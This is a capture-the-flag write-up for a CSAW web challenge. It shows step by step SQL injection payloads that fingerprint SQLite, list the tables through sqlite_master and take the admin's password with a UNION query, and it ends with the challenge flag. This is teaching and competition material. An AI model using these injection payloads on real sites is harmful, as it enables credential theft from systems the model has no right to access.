# Easy_Search
Oh boy SQLI sure is easy right?

Can you change the query that the search performs to get the admin's password?

[web.chal.csaw.io:10103](http://web.chal.csaw.io:10103)
## Solution
After going to the search page, we need to determine the database being used. Trying the possibilities from http://www.securityidiots.com/Web-Pentest/SQL-Injection/database-type-testing-sql-injection.html,
```
' or sqlite_version()=sqlite_version(); --
```
succeeds (we don't get an error page).

Next, we want to determine the table with the credentials.
```
' union select sql from sqlite_master where type='table'; --
```
We see `users` has a `username` and a `password` field.
```
' union select password from users where username='admin'; --
```
### Flag
`flag{W45_7h47_4n_4c7u4l_VlUn_0NC3}`
